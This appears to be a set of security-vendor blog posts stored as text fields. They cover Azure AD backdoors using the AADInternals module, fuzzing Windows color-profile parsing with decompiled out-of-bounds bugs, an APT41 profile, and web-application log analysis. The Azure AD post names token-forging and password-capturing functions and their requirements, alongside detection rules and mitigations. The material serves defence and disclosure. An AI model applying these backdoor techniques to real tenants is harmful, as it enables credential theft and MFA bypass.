these criminal service providers likely enables FIN11 to increase the scale and sophistication of their operations. To learn more about FIN11’s evolving delivery tactics, use of services, post-compromise TTPs, and monetization methods, register for Mandiant Advantage Free . The full FIN11 report is also available through our FireEye Intelligence Portal (FIP) . Then for even more information, register for our exclusive webinar on Oct. 29 where Mandiant threat intelligence experts will take a deeper dive into FIN11, including its origins, tactics, and potential for future activity.

                "text": "Mandiant has seen an uptick in incidents involving Microsoft 365 (M365) and Azure Active Directory (Azure AD). Most of these incidents are the result of a phishing email coercing a user to enter their credentials used for accessing M365 into a phishing site. Other incidents have been a result of password spraying, password stuffing, or simple brute force attempts against M365 tenants. In almost all of these incidents, the user or account was not protected by multi-factor authentication (MFA). These opportunistic attacks are certainly the most common form of compromise for M365 and Azure AD, and are usually the initial vector to establish persistence. During both incident response (IR) engagements and proactive cloud assessments we are often asked: What are some other types of attacks that Mandiant is seeing against M365 and Azure AD? Is it possible for an on-premises compromise to “vertically” move to M365 and Azure AD? If a global administrator account is compromised, is it possible to maintain persistence even after the compromised account has been detected, a password reset has occurred, and MFA has been applied? AADInternals PowerShell Module In some incidents, Mandiant has witnessed attackers utilizing a PowerShell module called AADInternals , which can allow an attacker to vertically move from on-premises to Azure AD, establish backdoors, steal passwords, generate user security tokens, and bypass MFA protections. This PowerShell module has allowed attackers to maintain persistence in the tenant even after initial eradication efforts were conducted. To see this module in action and understand how it works, Dr. Nestori Syynimaa’s PSCONFEU 2020 presentation, Abusing Azure Active Directory: Who would you like to be today? , provides an in-depth overview of the module. To detect the use of AADInternals, it is important to understand how some of these attacks work. Once an understanding is established, abnormal usage can be detected through a combination of log analysis and host-based indicators. Backdoor 1: Abusing Pass-Through Authentication Attacker Requirements Local Administrative Access to a server running Pass-through Authentication Or M365 global administrator credentials The AADInternals PowerShell module contains a function called Install-AADIntPTASPY . The function works by inserting itself as a man-in-the-middle within the Pass-through Authentication (PTA) process that occurs between Azure AD and the server running the PTA Agent in the on-premises environment. Commonly, the PTA Agent runs on the same on-premises server as Azure AD Connect (AAD Connect). When PTA is enabled, every logon that occurs against Azure AD gets redirected to the PTA Agent on-premises. The PTA Agent asks an on-premises Active Directory Domain Controller if a password is valid for an authenticating account. If valid, the PTA Agent responds back to Azure AD to grant the requestor access. Figure 1 provides the workflow of Pass-through Authentication and where AADInternals can intercept the request. Figure 1: Pass-through Authentication workflow Once the function is running, every PTA attempt against Azure AD will be intercepted by the installed AADIntPTASpy module. The module will record the user’s password attempt and reply back to Azure AD on behalf of the PTA Agent. This reply advises Azure AD the password attempt was valid and grants the user access to the cloud, even if the password is incorrect. If an attacker has implanted AADIntPTASpy , they can log in as any user that attempts to authenticate using PTA—and will be granted access. Additionally, all password attempts that are registered by the AADIntPTASpy module are recorded within a log file on the server (Default location: C:\\PTASpy\\PTASPy.csv ). Figure 2 shows how the log file can be decoded to reveal a user’s password in cleartext. Figure 2: PTASpy.csv decoded passwords Not only will this function allow an attacker to login as any user who authenticates via PTA, but it will also act as a repository for collecting user passwords who are legitimately logging into Azure AD. This could allow an attacker to pivot their attack to other areas of the network—or use these credentials against other internet accessible portals that may leverage single-factor authentication (e.g., VPN gateway). An attacker can use this module in one of two ways: Method 1: On-Premises Compromise An attacker has gained access to an on-premises domain and is able to laterally move to the AADConnect / PTA Agent Server. From this server, an attacker can potentially leverage the AADInternals PowerShell module and invoke the Install-AADIntPTASpy function. Method 2: Cloud Compromise If an attacker has successfully compromised an Azure AD global admin account , an attack can be conducted from an attacker’s own infrastructure. An attacker can install a PTA Agent on a server they manage and register the agent using the compromised global administrator account (Figure 3). Figure 3: Azure AD Portal—registered Pass-through Authentication agents Once registered with Azure AD, the rogue server will begin to intercept and authorize all login attempts. As with Method 1, this server can also be used to harvest valid credentials. Backdoor 2: Abusing Identity Federation Attacker Requirements Local administrative access to AD and server running Active Directory Federation Services Or M365 global administrator credentials Another method of authenticating to M365 is through the usage of federation services. When a M365 domain is configured as a federated domain, a trust is configured between M365 and an external identify provider. In many cases, this trust is established with an Active Directory Federation Services (ADFS) server for an on-premises Active Directory domain. Once a trust is established, when a user logs into M365 using a federated domain, their request is redirected to the external identify provider (ADFS) where their authentication is validated (Figure 4). Once validated, the ADFS server provides the user a security token. This token is then trusted by M365 and grants the access to the platform. Figure 4: Microsoft 365 Federation Sign-in workflow AADInternals has a PowerShell function to craft security tokens, which mimics the ADFS authentication process. When providing the function a valid UserPrincipalName, Immutable ID and IssuerURI, an attacker can generate a security token as any user of the tenant. What’s even more concerning is that once this security token is generated, this can allow an attacker to bypass MFA. As with Backdoor 1, this attack can either be performed from a compromised on-premises environment or from an attacker’s own infrastructure. Method 1: On-Premises Compromise Once an attacker has gained access to an on-premises domain with elevated access, they can begin to collect the required information to craft their own security tokens to backdoor into M365 as any user. An attacker will require: A valid UserPrincipalName and Immutable. Both of these attributes can be pulled from the on-premises Active Directory domain. IssuerURI of the ADFS server and ADFS Signing certificate. This can be obtained from an ADFS server when directly logged into the server or remotely querying the server via an privileged account. Once an attacker has collected the necessary information, using the AADInternals Open-AADIntOffice365Portal command, a security token for the user can be generated granting an attacker access to M365 (Figure 5). Figure 5: AADInternals Open-AADIntOffice365Portal command Method 2: Cloud Compromise If an attacker has a compromised an M365 Global Administrator account, using their own infrastructure, an attacker can use their administrative access to collect user information and reconfigure the tenant to establish their backdoor. In this method, an attacker will require: A valid UserPrincipalName and valid ImmutableId. Figure 6 shows how the Get-MsolUser command can obtain a user’s ImmutableId from Azure AD. Figure 6: Get-MsolUser—list user UPN & ImmutableId IssuerURI This can be obtained by converting a managed domain to a federated domain. Figures 7 through 10 show how the AADInternals ConvertTo-AADIntBackdoor command (Figure 8) can be used to allow attacker to register their own IssuerURI for a federated domain. Figure 7: Get-msoldomain—list of registered domains and authentication Figure 8: ConvertTo-AADIntBackdoor—convert domain to federated authentication Figure 9: Changed authentication method Figure 10: Azure AD Portal registered domains Note: To not interrupt production and authentication with an existing federated domain (and to remain undetected), an attacker may opt to register a new domain with the tenant. Figure 11: AADInternals Open-AADIntOffice365Portal Command using new Federated domain Once an attacker has properly configured the tenant, using the ImmutableId of any user, a security token can be generated by executing the Open-AADIntOffice365Portal command (Figure 11). This will allow an attacker to login as that user without the need for a valid certificate or a legitimate IssuerURI. Fortunately for defenders, this method will generate a number of events in the unified audit log, which can be leveraged for monitoring and alerting. Mitigation and Detection Once persistence is established, it can be extremely difficult to detect login activity that is utilizing one of the previously described methods. In lieu of this, it is recommended to monitor and alert on M365 unified audit logs and Azure AD sign-in activity to detect anomalous activity. Detection in FireEye Helix Being that Mandiant has seen this methodology being used in the wild, we felt it was necessary to build these detections into our FireEye Helix security platform. Helix engineers have created sever new detection rules that monitor for detectable activity of an attacker making use of the AADInternals PowerShell module. The following five rules will monitor a server’s event logs and alert upon the installation and usage of the AADInternals PowerShell module (Figure 12). The detection of these activities could be high fidelity alerts that an attacker is preparing to configure backdoors into M365 and Azure AD environments. Figure 12: AADInternals Helix rules If an attacker has successfully configured a backdoor using AADInternals, Helix will alert upon the following events registered in the Office 365 unified audit log and Azure Activity Log as indication of a possible event (Figure 13 and Figure 14). It is important to note that these alerts could be triggered upon legitimate administrator activity. When responding to these alerts, first check with your M365 and Azure AD administrator to verify the activity before raising a security event. Figure 13: Office 365 and Azure Helix rules Figure 14: PTA Connector Registered alert description Hunting for Backdoors in M365 Unified Audit Logs and Azure AD Logs If you suspect a global administrator account was compromised and you want to review Azure AD for indicators of potential abuse, the following should be reviewed (note that these same concepts can be used for proactive log monitoring): From Azure AD Sign-ins logs, monitor logon activity from On-Premises Directory Synchronization Service Accounts. This account is used by the Azure AD Connect service (Figure 15). Figure 15: Azure AD Sign-ins Baseline the IP addresses used by this account and make sure the IPs match those assigned to the on-premises WAN infrastructure. If the attacker has configure a PTA Agent on their own infrastructure, seeing an IP that does not match your baseline could be an indicator that a rogue PTA Agent has been configured by the attacker (Figure 16). Figure 16: Azure AD Sign-in logs—On-Premises Directory Synchronization Services account From Azure AD Sign-ins, monitor and baseline Azure AD Sign-ins to the Azure AD Application Proxy Connector. Make sure to validate username, IP and location. These events are typically only generated when a new PTA agent is connected to the tenant. This could be an indicator that an attacker has connected a rogue PTA server hosted on an attacker’s infrastructure (Figure 17). Figure 17: Azure AD Sign-in logs—Azure AD Application Proxy Connector If using Azure Sentinel, this event will also be registered in the Azure AuditLogs table as a “ Register Connector ” OperationName (Figure 18). Figure 18: Register Connector—Azure Sentinel logs In the Azure Management Portal under the Azure AD Connect blade, review all registered servers running PTA Agent.

When an attacker is able to create a domain federation within a compromised cloud tenant, and link this to attacker-owned infrastructure, this will generate activity in the log (Figure 21). https://Protections.office.com/unifiedauitlog > Audit Log Search Select Directory Administration Activates category to select all activities Create New Alert Policy (Figure 20) Figure 20: Unified Audit Log > Create new alert policy Figure 21: Unified Audit Log filtered for domain related events Using Azure Sentinel, more granular Directory Administration Activities can be modified for suspicious activity. This includes additions, deletions and modifications of domains and their authentication settings (Figure 22). Monitoring for OfficeActivity Operations in Azure Sentinel can allow an organization to validate if this is normalized activity or if an attacker is working on setting up a backdoor for PTA or federation. Table: OfficeActivity Operation: Set-AcceptedDomain Operation: Set-MsolDomainFederationSettings Operation: Add-FederatedDomain Operation: New-Accepted Domain Operation: Remove-Accepted Domain Operation: Remove-FederatedDomain Figure 22: OfficeActivity Operations Azure Sentinel logs Detection On-Premises If an attacker is able to compromise on-premises infrastructure and access a server running AD Connect or ADFS services with the intention of leveraging a tool such as AADInternals to expand the scope of their access to include cloud, timely on-premises detection and containment is key. The following methods can be leveraged to ensure optimized visibility and detection for the scope of activities described in this post: Treat ADFS and Azure AD Connect servers as Tier 0 assets . Use a dedicated server for each. Do not install these roles and server in addition to other. All too often we are seeing Azure AD Connect running on a file server. Ensure PowerShell logging is optimized on AD Connect and ADFS servers Review Microsoft-Windows-PowerShell/Operational logs on ADFS and AADConnect Server Logs. If PowerShell logging is enabled, search for Event ID 4101. This event ID will record the event where AADInternals was installed (Figure 23). Figure 23: EventID 410—Installed Module Additionally, with this logging enabled, you will be able to review the PowerShell commands used by an attacker. In PowerShell, run Get-Module -All and look for the presence of AADInternals (Figure 24). Figure 24: Get-Module command to list installed modules Alert for the presence of C:\\PTASpy and C:\\PTASpy\\PTASpy.csv. This is the default location of the log file that contains records of all the accounts that were intercepted by the tool. Remember, an attacker may also use this to harvest credentials, so it is important to reset the password for these accounts (Figure 25). Figure 25: PTASpy.csv log activity Mitigations In order for this attack to be successful, an attacker must gain administrative privileges on a server running Azure AD Connect and/or gain global administrator rights within M365. Simple practices such as limiting and properly protecting global administrator accounts as well as properly protecting Tier 0 assets can greatly reduce the risk of an attacker successfully using the AADInternals PowerShell against your organization. Limit or restrict access to Azure AD Connect servers. Any server acting as an identity provider or facilitating identity federation should be treated as a Tier 0 asset. Create separate dedicated global administrator accounts . Global administrators should be cloud-only accounts. These accounts should not retain any licensing. Implement MFA on all accounts: admins, users and services. If a particular account cannot use MFA, apply a conditional access rule that limits its logon to a trusted network. This works particularly well for service accounts. Establish a roadmap to block legacy authentication . Limit which accounts are synced from on-premises to the cloud . Do not sync privileged or service accounts to the cloud. Use Azure administrative roles . Not everybody or everything needs to be a global admin to administer the environment. Use password hash sync over Pass-through Authentication. Many organizations are reluctant to sync their password to Azure AD. The benefits from this service greatly outweigh the risks. Being able to use global and custom banned passwords lists , for both the cloud and on-premises , is a tremendous benefit. Forward all M365 unified audit logs and Azure logs to a SIEM and build detections. Ensure you are forwarding the logs recommended in this post and building the appropriate detections and playbooks within your security operations teams. Specifically monitor for: Set-AcceptedDomain Set-MsolDomainFederationSettings Add-FederatedDomain New-Accepted Domain Remove-Accepted Domain Remove-FederatedDomain Periodically review all identity providers and custom domains configured in the M365 tenant. If an attacker is successful at gaining global administrative privileges, they may choose to add their own identity provider and custom domain to maintain persistence.

                "text": "Image parsing and rendering are basic features of any modern operating system (OS). Image parsing is an easily accessible attack surface, and a vulnerability that may lead to remote code execution or information disclosure in such a feature is valuable to attackers. In this multi-part blog series, I am reviewing Windows OS’ built-in image parsers and related file formats: specifically looking at creating a harness, hunting for corpus and fuzzing to find vulnerabilities. In part one of this series I am looking at color profiles—not an image format itself, but something which is regularly embedded within images. What is an ICC Color Profile? Wikipedia provides a more-than-adequate description of ICC color profiles : \"In color management, an ICC profile is a set of data that characterizes a color input or output device, or a color space, according to standards promulgated by the International Color Consortium (ICC). Profiles describe the color attributes of a particular device or viewing requirement by defining a mapping between the device source or target color space and a profile connection space (PCS). This PCS is either CIELAB (L*a*b*) or CIEXYZ. Mappings may be specified using tables, to which interpolation is applied, or through a series of parameters for transformations. ” In simpler terms, an ICC color profile is a binary file that gets embedded into images and parsed whenever ICC supported software processes the images. Specification The ICC specification is around 100 pages and should be easy to skim through. Reading through specifications gives a better understanding of the file format, different types of color profiles, and math behind the color transformation. Furthermore, understanding of its file format internals provides us with information that can be used to optimize fuzzing, select a good corpus, and prepare fuzzing dictionaries. History of Color Management in Windows Windows started to ship Image Color Management (ICM) version 1.0 on Windows 95, and version 2.0 beginning with Windows 98 onwards. A major overhaul to Windows Color System (WCS) 1.0 happened in Windows Vista onwards. While ICC color profiles are binary files, WCS color profiles use XML as its file format. In this blog post, I am going to concentrate on ICC color profiles. Microsoft has a list of supported Windows APIs . Looking into some of the obviously named APIs, such as OpenColorProfile , we can see that it is implemented in MSCMS.dll. This DLL is a generic entry point and supports loading of Microsoft’s Color Management Module (CMM) and third-party CMMs such as Adobe’s CMM. Microsoft’s CMM—the ICM—can be found as ICM32.dll in system32 directory. Figure 1: ICM32 Windows’ CMM was written by a third-party during the Windows 95 era and still ships more or less with the same code (with security fixes over the decades). Seeing such an old module gives me some hope of finding a new vulnerability. But this is also a small module that may have gone through multiple rounds of review and fuzzing: both by internal product security teams and by external researchers, reducing my hopes to a certain degree. Looking for any recent vulnerabilities in ICM32, we can see multiple bugs from 2017-2018 by Project Zero and ZDI researchers, but then relative silence from 2019 onwards. Making a Harness Although there is a list of ICM APIs in MSDN, we need to find an API sequence used by Windows for any ICC related operations. One of the ways to find our API sequence is to search a disassembly of Windows DLLs and EXEs in hope to find the color profile APIs being used. Another approach is to find a harness for open source Color Management Systems such as Little CMS (LCMS). Both of these end up pointing to very small set of APIs with functionality to open color profiles and create color transformations. Given this information, a simple initial harness was written: #include <stdio.h> #include <Windows.h> #include <Icm.h> #pragma comment(lib, \"mscms.lib\") int main(int argc, char** argv) { char dstProfilePath[] = \"sRGB Color Space Profile.icm\"; tagPROFILE destinationProfile; HPROFILE   hDstProfile = nullptr; destinationProfile.dwType = PROFILE_FILENAME; destinationProfile.pProfileData = dstProfilePath; destinationProfile.cbDataSize = (strlen(dstProfilePath) + 1); hDstProfile = OpenColorProfileA(&destinationProfile, PROFILE_READ, FILE_SHARE_READ, OPEN_EXISTING); if (nullptr == hDstProfile) { return -1; } tagPROFILE sourceProfile; HPROFILE   hSrcProfile = nullptr; HTRANSFORM hColorTransform = nullptr; DWORD dwIntent[] = { INTENT_PERCEPTUAL, INTENT_PERCEPTUAL }; HPROFILE hProfileList[2]; sourceProfile.dwType = PROFILE_FILENAME; sourceProfile.pProfileData = argv[1]; sourceProfile.cbDataSize = (strlen(argv[1]) + 1); hSrcProfile = OpenColorProfileA(&sourceProfile, PROFILE_READ, FILE_SHARE_READ, OPEN_EXISTING); if (nullptr == hSrcProfile) { return -1; } hProfileList[0] = hSrcProfile; hProfileList[1] = hDstProfile; hColorTransform = CreateMultiProfileTransform( hProfileList, 2, dwIntent, 2, USE_RELATIVE_COLORIMETRIC | BEST_MODE, INDEX_DONT_CARE ); if (nullptr == hColorTransform) { return -1; } DeleteColorTransform(hColorTransform); CloseColorProfile(hSrcProfile); CloseColorProfile(hDstProfile); return 0; } Listing 1: Harness Hunting for Corpus and Dictionary Sites offering multiple color profiles can be found all over the internet. One of the other main source of color profile is images; many image files contain a color profile but require some programming/tools to dump their color profile to stand-alone files. Simply skimming through the specification, we can also make sure the corpus contains at least one sample from all of the seven different color profiles. This along with the code coverage information can be used to prepare the first set of corpuses for fuzzing. A dictionary, which helps the fuzzer to find additional code paths, can be prepared by combing through specifications and creating a list of unique tag names and values. One can also find dictionaries from open source fuzzing attempts on LCMS, etc. Fuzzing I used a 16-core machine to fuzz the harness with my first set of corpuses. Code coverage information from MSCMS.dll and ICM32.dll was used as feedback for my fuzzer. Crashes started to appear within a couple of days.

For that, we need to go one call up to icm32!InitNamedColorProfileData . __int64 __fastcall InitNamedColorProfileData(__int64 a1, void *hProfile, int a3, _DWORD *a4) { ... ... errCode = CMGetPartialProfileElement(hProfile, 'ncl2', 0, pBuffSize, 0i64);      // getting size of ncl2 element if ( errCode ) return errCode; minSize = pBuffSize[0]; if ( pBuffSize[0] < 0x55 ) minSize = 0x55; pBuffSize[0] = minSize; outBuff = SmartNewPtrClear(minSize, &errCode);                                    // allocating the buffer for ncl2 ... ... errCode = CMGetPartialProfileElement(hProfile, 'ncl2', 0, pBuffSize, outBuff);    // reading ncl2 elements to buffer if ( !errCode ) { ... ... totalSizeToRead = count * totalDeviceCoord; if ( totalSizeToRead < 0xFFFFFFFFFFFFFFAEui64 && totalSizeToRead + 0x51 <= pBuffSize[0] )  // totalSizeToRead + 0x51 <= element size? { currPtr = outBuff + 0x54;            // wrong offset of 0x54 is used ... ... do { SwapShortOffset((currPtr + 0x20), 0, 6u); ... --count; }while(count) Listing 4: InitNamedColorProfileData decompiled Here the code tries to read the ‘ncl2’ tag/element and get the size of the stream from file. A buffer is allocated and the same call is made once again to read the complete content of the element ‘ncl2’. This buffer is parsed to find the count and number of device coordinates, and the values are verified by making sure read/write ends up with in the buffer size. The vulnerability here is that the offset (0x51) used for verification is smaller than the offset (0x54) used to advance the buffer pointer. This error provides a 3 byte out of bound read and write. The fix for this was pretty straight forward—change the verification offset to 0x54, which is how Microsoft fixed this bug. Additional Vulnerabilities While looking at the previous vulnerability, one can see a pattern of using the CMGetPartialProfileElement function for reading the size, allocation, and reading content. This sort of pattern can introduce bugs such as unconstrained size or integer overflow while adding an offset to the size, etc. I decided to pursue this function and see if such instances are present within ICM32.dll. I found three instances which had an unchecked offset access: CMConvIndexToNameProfile , CMConvNameToIndexProfile and CMGetNamedProfileInfoProfile . All of these functions are accessible through exported and documented MSCMS functions: ConvertIndexToColorName , CMConvertColorNameToIndex , and GetNamedProfileInfo respectively. __int64 __fastcall CMConvIndexToNameProfile(HPROFILE hProfile, __int64 a2, __int64 a3, unsigned int a4) { ... ... errCode = CMGetPartialProfileElement(hProfile, 'ncl2', 0, pBuffSize, 0i64);    // read size if ( !errCode ) { allocBuff = SmartNewPtr(pBuffSize[0], &errCode); if ( !errCode ) { errCode = CMGetPartialProfileElement(hProfile, 'ncl2', 0, pBuffSize, allocBuff);    // read to buffer if ( !errCode ) { SwapLongOffset((allocBuff + 12), 0, 4u);         // 12 > *pBuffSize ? SwapLongOffset((allocBuff + 16), v12, v13); Listing 5: CMConvIndexToNameProfile decompiled The bug discovered in CMConvIndexToNameProfile and the other two functions is that there is no minimum length check for ‘ncl2’ elements and offsets 12 and 16 are directly accessed for both read and write—providing out of bound read/write to allocBuffer , if the size of allocBuffer is smaller than 12. Microsoft decided not to immediately fix these three vulnerabilities due to the fact that none of the Windows binaries use these functions. Independently, we did not find any Windows or third-party software using these APIs. Conclusion In part one of this blog series, we looked into color profiles, wrote a harness, hunted for corpus and successfully found multiple vulnerabilities. Stay tuned for part two, where we will be looking at a relatively less talked about vulnerability class: uninitialized memory. Subscribe to Blogs Get email updates as new blog posts are added."

                "text": "Today, FireEye Intelligence is releasing a comprehensive report detailing APT41, a prolific Chinese cyber threat group that carries out state-sponsored espionage activity in parallel with financially motivated operations. APT41 is unique among tracked China-based actors in that it leverages non-public malware typically reserved for espionage campaigns in what appears to be activity for personal gain. Explicit financially-motivated targeting is unusual among Chinese state-sponsored threat groups, and evidence suggests APT41 has conducted simultaneous cyber crime and cyber espionage operations from 2014 onward. The full published report covers historical and ongoing activity attributed to APT41, the evolution of the group’s tactics, techniques, and procedures (TTPs), information on the individual actors, an overview of their malware toolset, and how these identifiers overlap with other known Chinese espionage operators. APT41 partially coincides with public reporting on groups including BARIUM ( Microsoft ) and Winnti ( Kaspersky , ESET , Clearsky ). Who Does APT41 Target? Like other Chinese espionage operators, APT41 espionage targeting has generally aligned with China's Five-Year economic development plans . The group has established and maintained strategic access to organizations in the healthcare, high-tech, and telecommunications sectors. APT41 operations against higher education, travel services, and news/media firms provide some indication that the group also tracks individuals and conducts surveillance. For example, the group has repeatedly targeted call record information at telecom companies. In another instance, APT41 targeted a hotel’s reservation systems ahead of Chinese officials staying there, suggesting the group was tasked to reconnoiter the facility for security reasons. The group’s financially motivated activity has primarily focused on the video game industry, where APT41 has manipulated virtual currencies and even attempted to deploy ransomware. The group is adept at moving laterally within targeted networks, including pivoting between Windows and Linux systems, until it can access game production environments. From there, the group steals source code as well as digital certificates which are then used to sign malware. More importantly, APT41 is known to use its access to production environments to inject malicious code into legitimate files which are later distributed to victim organizations. These supply chain compromise tactics have also been characteristic of APT41’s best known and most recent espionage campaigns. Interestingly, despite the significant effort required to execute supply chain compromises and the large number of affected organizations, APT41 limits the deployment of follow-on malware to specific victim systems by matching against individual system identifiers. These multi-stage operations restrict malware delivery only to intended victims and significantly obfuscate the intended targets. In contrast, a typical spear-phishing campaign’s desired targeting can be discerned based on recipients' email addresses. A breakdown of industries directly targeted by APT41 over time can be found in Figure 1. Figure 1: Timeline of industries directly targeted by APT41 Probable Chinese Espionage Contractors Two identified personas using the monikers “Zhang Xuguang” and “Wolfzhi” linked to APT41 operations have also been identified in Chinese-language forums. These individuals advertised their skills and services and indicated that they could be hired. Zhang listed his online hours as 4:00pm to 6:00am, similar to APT41 operational times against online gaming targets and suggesting that he is moonlighting. Mapping the group’s activities since 2012 (Figure 2) also provides some indication that APT41 primarily conducts financially motivated operations outside of their normal day jobs. Attribution to these individuals is backed by identified persona information, their previous work and apparent expertise in programming skills, and their targeting of Chinese market-specific online games. The latter is especially notable because APT41 has repeatedly returned to targeting the video game industry and we believe these activities were formative in the group’s later espionage operations. Figure 2: Operational activity for gaming versus non-gaming-related targeting based on observed operations since 2012 The Right Tool for the Job APT41 leverages an arsenal of over 46 different malware families and tools to accomplish their missions, including publicly available utilities, malware shared with other Chinese espionage operations, and tools unique to the group. The group often relies on spear-phishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims. Once in a victim organization, APT41 can leverage more sophisticated TTPs and deploy additional malware. For example, in a campaign running almost a year, APT41 compromised hundreds of systems and used close to 150 unique pieces of malware including backdoors, credential stealers, keyloggers, and rootkits. APT41 has also deployed rootkits and Master Boot Record (MBR) bootkits on a limited basis to hide their malware and maintain persistence on select victim systems. The use of bootkits in particular adds an extra layer of stealth because the code is executed prior to the operating system initializing. The limited use of these tools by APT41 suggests the group reserves more advanced TTPs and malware only for high-value targets. Fast and Relentless APT41 quickly identifies and compromises intermediary systems that provide access to otherwise segmented parts of an organization’s network. In one case, the group compromised hundreds of systems across multiple network segments and several geographic regions in as little as two weeks. The group is also highly agile and persistent, responding quickly to changes in victim environments and incident responder activity. Hours after a victimized organization made changes to thwart APT41, for example, the group compiled a new version of a backdoor using a freshly registered command-and-control domain and compromised several systems across multiple geographic regions. In a different instance, APT41 sent spear-phishing emails to multiple HR employees three days after an intrusion had been remediated and systems were brought back online. Within hours of a user opening a malicious attachment sent by APT41, the group had regained a foothold within the organization's servers across multiple geographic regions. Looking Ahead APT41 is a creative, skilled, and well-resourced adversary, as highlighted by the operation’s distinct use of supply chain compromises to target select individuals, consistent signing of malware using compromised digital certificates, and deployment of bootkits (which is rare among Chinese APT groups). Like other Chinese espionage operators, APT41 appears to have moved toward strategic intelligence collection and establishing access and away from direct intellectual property theft since 2015. This shift, however, has not affected the group's consistent interest in targeting the video game industry for financially motivated reasons. The group's capabilities and targeting have both broadened over time, signaling the potential for additional supply chain compromises affecting a variety of victims in additional verticals. APT41's links to both underground marketplaces and state-sponsored activity may indicate the group enjoys protections that enables it to conduct its own for-profit activities, or authorities are willing to overlook them. It is also possible that APT41 has simply evaded scrutiny from Chinese authorities. Regardless, these operations underscore a blurred line between state power and crime that lies at the heart of threat ecosystems and is exemplified by APT41. Read the report today to learn more .

                "text": "Many organizations operating in e-commerce, hospitality, healthcare, managed services, and other service industries rely on web applications. And buried within the application logs may be the potential discovery of fraudulent use and/or compromise! But, let's face it, finding evil in application logs can be difficult and overwhelming for a few reasons, including: The wide variety of web applications with unique functionality The lack of a standard logging format Logging formats that were designed for troubleshooting application issues and not security investigations The need for a centralized log analysis solution or SIEM to process and investigate a large amount of application log data So, in this blog post, we discuss threat modeling concepts that can help prioritize logging decisions and unleash the ability to identify and investigate attacks against an application. To help us demonstrate, we'll describe situations for a fictitious organization called Dog and Feline Urgent Response, or DFUR, that we presented at the 2020 SANS Digital Forensics & Incident Response (DFIR) Summit . We selected Splunk Enterprise Security (ES) as DFUR’s SIEM and logging analysis platform, but this is just one option and there are multiple technologies that can facilitate application log analysis. We created a Splunk application called “ Dog and Feline Urgent Response (DFUR) ” available on the FireEye GitHub that contains pre-indexed data and dashboards that you can use to follow along with the following attack scenarios. But, enough kitten around. Let’s introduce you to DFUR! DFUR: Dog and Feline Urgent Response DFUR is a long-standing organization in the pet wellness industry that provides care providers, pet owners, and insurance providers with application services. Care providers, such as veterinarians, use DFUR to process patient records, submit prescriptions, and order additional care services Pet owners use DFUR to make appointments, pay bills, and see diagnostic test results Insurance providers use DFUR to receive and pay claims to pet care providers Application users log into a web portal that forwards logon and user transaction logs to DFUR’s Splunk ES instance. Backend databases store metadata for users, such as street addresses and contact information. DFUR Security Team Threat Modeling After stumbling through several incidents, the DFUR security team realized that their application did not log the information needed to answer investigative question clearly and quickly. The team held workshops with technical stakeholders to develop a threat model and improve their application security strategy. They addressed questions, such as: What types of threats does DFUR face based on industry trends? What impact could those threats have? How could the DFUR application be attacked or abused? What log data would DFUR need to prove an attack or fraud happened? The DFUR team compiled the stakeholder feedback and developed a threat profile to identify and prioritize high-risk threats facing the DFUR application platform, including: Account takeover and abuse Password attacks (e.g., credential stuffing) Bank account modifications PHI/PII access Health service modifications or interruptions Fraudulent reimbursement claim submission Veterinarians over-prescribing catnip The DFUR security team discussed how they could identify threats using their currently available logs, and, well, the findings were not purr-ty. Logging Problems Identified The DFUR team used their threat model to determine what log sources were relevant to their security mission, and then they dug into each one to confirm the log events were valid, normalized, and accessible. This effort produced a list of high-priority logging issues that needed to be addressed before the security team could move forward with developing methods for detection and analysis: Local logs were not forwarded to their Splunk ES instance . Only a limited subset of logging was forwarded to their Splunk ES instance, so DFUR analysts couldn't search for the actions performed by users who were authenticated to the application portal. Inaccurate field mapping . DFUR analysts identified extracted field values that were mapped to incorrect field names. One example was the user-agent in authentication log events had been extracted as the username field. Application updates sometimes affected Splunk ingestion and parsing. DFUR analysts identified servers that didn't have a startup script to ensure log forwarding was enabled upon system reboot. Application updates changed the logging output format which broke field extractions. DFUR analysts didn't have a way to determine when log sources weren't operating as expected. Time zone misconfigurations . DFUR analysts determined their log sources had multiple time zone configurations which made correlation difficult. The log archival settings needed to be modified . DFUR analysts needed to configure their Splunk ES instance data retirement policy to maintain indexed data for a longer time period and archive historical data for quick restoration. Source IP addresses of users logging into the portal were masked by a load balancer. The DFUR analysts realized that the source IP address for every user logon was a load balancer, which made attribution even more difficult. The X-Forwarded-For (XFF) field in their appliances needed to be enabled. Analysis Problems Identified The DFUR infosec team reviewed how previous incidents involving the DFUR application were handled. They quickly learned that they needed to solve the following operational issues before they could effectively investigate application attacks: Inconsistency during manual analysis . DFUR analysts took different approaches to searching their Splunk ES instance, and they would reach different conclusions. Playbooks were needed to define a standard investigative methodology for common incident scenarios. No documentation of log fields or sources . Some DFUR analysts were not aware of all relevant data sources that were available when investigating security incidents. This led to findings that were based on a small part of the picture. A data dictionary was needed that defines the log sources and fields in the DFUR Splunk ES instance and the retention time for each log source. Application logs were designed for troubleshooting, not investigating . The DFUR application was configured to log diagnostic information, application errors, and limited subsets of successful user activity. The DFUR team needed to reconfigure and develop the application to record more security related events. DFUR: New and Improved Monitoring and Detection The DFUR team addressed their application log and analysis problems and started building a detection and investigative capability in their Splunk ES instance. Using the analysis workflows developed during the threat modeling process, the DFUR team designed Splunk dashboards (Figure 1) to provide detection analytics and context around three primary datapoints: usernames, IP addresses, and care providers (“organizations”). Figure 1: DFUR monitoring and detection dashboard The DFUR team created the Splunk dashboards using Simple XML to quickly identify alerts and pivot among the primary datapoints, as seen in Figure 2. The DFUR team knew that their improved and streamlined methodology would save time compared to exporting, analyzing, and correlating raw logs manually. Figure 2: Pivoting concepts used to develop DFUR dashboards Newly armed (legged?) with a monitoring and detection capability, the DFUR team was ready to find evil! Attack Scenario #1: Account Takeover The next morning, the DFUR security team was notified by their customer service team of a veterinarian provider with the username ‘labradorable’ who hadn’t received their daily claims payment and noticed their banking information in the DFUR portal was changed overnight. A DFUR analyst opened the User Activity Enrichment dashboard (Figure 3) and searched for the username to see recent actions performed by the account. Figure 3: User Activity Enrichment dashboard The analyst reviewed the Remote Access Analytics in the dashboard and identified the following anomalies (Figure 4): The username reminder and password reset action was performed the day before from an Indonesia-based IP address The user account was logged in from the same suspicious IP address shortly after The legitimate user always logs in from California, so the Indonesia source IP login activity was highly suspicious Figure 4: Remote access analytics based on user activity The DFUR analyst clicked on the Application Activity tab in the User Activity Enrichment dashboard to see what actions were performed by the user while they were logged in from the suspicious IP address. The analyst identified the user account logged in from the suspicious IP address and performed an email address change and added two (2) new bank accounts, as seen in Figure 5. Figure 5: Application activity timeline filtered based on IP address The DFUR analyst confirmed that the two (2) bank accounts were added by the user to the care provider with organization ID 754354, as seen in Figure 